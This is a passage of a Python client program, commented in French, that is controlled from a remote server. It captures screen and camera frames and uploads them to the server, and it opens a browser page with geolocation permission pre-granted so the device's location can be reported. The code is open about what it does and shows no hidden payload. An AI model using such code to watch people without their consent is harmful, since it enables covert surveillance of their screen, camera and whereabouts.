    # ------------------------------------------------------------------
    # Navigateur de localisation
    # ------------------------------------------------------------------
    def _open_location_browser(self) -> None:
        url = f"{self.server_url}/location/page?device_id={self.device_id}"
        browser_path = _find_app_mode_browser()
        try:
            if browser_path:
                _grant_geolocation_permission(LOCATION_PROFILE_DIR, self.server_url)
                self._location_process = subprocess.Popen([
                    browser_path,
                    f"--app={url}",
                    f"--window-size={LOCATION_WINDOW_SIZE}",
                    "--new-window",
                    f"--user-data-dir={LOCATION_PROFILE_DIR}",
                    "--no-first-run",
                    "--no-default-browser-check",
                ])
            else:
                webbrowser.open(url, new=1)
                self._location_process = None
                logger.warning(
                    "Aucun navigateur en mode « app » trouvé : ouverture dans le navigateur "
                    "par défaut. Fermeture à distance impossible dans ce cas."
                )
            self.location_open = True
            logger.info("Navigateur de localisation ouvert (%s)", url)
        except Exception as exc:
            logger.error("Impossible d'ouvrir le navigateur de localisation : %s", exc)

    def _close_location_browser(self) -> None:
        self.location_open = False
        process = self._location_process
        self._location_process = None
        if process is not None and process.poll() is None:
            try:
                process.terminate()
                process.wait(timeout=3)
            except Exception:
                try:
                    process.kill()
                except Exception:
                    pass
        logger.info("Navigateur de localisation fermé (ou déjà fermé)")

    # ------------------------------------------------------------------
    # Envoi au serveur
    # ------------------------------------------------------------------
    def _send_frame(self, frame, stream: str, session: requests.Session, ts: int) -> None:
        if stream == "screen":
            height, width = frame.shape[:2]
            if width > SCREEN_MAX_WIDTH:
                scale = SCREEN_MAX_WIDTH / width
                frame = cv2.resize(
                    frame, (SCREEN_MAX_WIDTH, max(1, int(height * scale))), interpolation=cv2.INTER_LINEAR
                )
            quality = SCREEN_JPEG_QUALITY
        else:
            quality = CAMERA_JPEG_QUALITY

        ok, buffer = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
        if not ok:
            return
        try:
            session.post(
                f"{self.server_url}/api/frame",
                params={"device_id": self.device_id, "stream": stream, "ts": ts},
                data=buffer.tobytes(),
                headers={"Content-Type": "application/octet-stream"},
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException:
            pass


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Client caméra / écran piloté à distance")
    parser.add_argument("--server", help="URL du serveur (ex. https://mon-serveur.onrender.com)")
    parser.add_argument("--save", action="store_true", help="mémorise --server pour les prochains lancements")
    parser.add_argument("--debug", action="store_true", help="affiche les logs détaillés (commandes reçues, etc.)")
    parser.add_argument("--once", action="store_true", help="un seul cycle de test, puis quitte")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    server_url = resolve_server_url(args.server)
    if args.save:
        if not args.server:
            logger.error("--save nécessite --server")
            return
        save_config(server_url)

    device_id = get_or_create_device_id()
    device_name = socket.gethostname()

    client = CameraClient(server_url, device_id, device_name)
    if args.once:
        client.run_once()
    else:
        client.run_forever()


if __name__ == "__main__":
    main()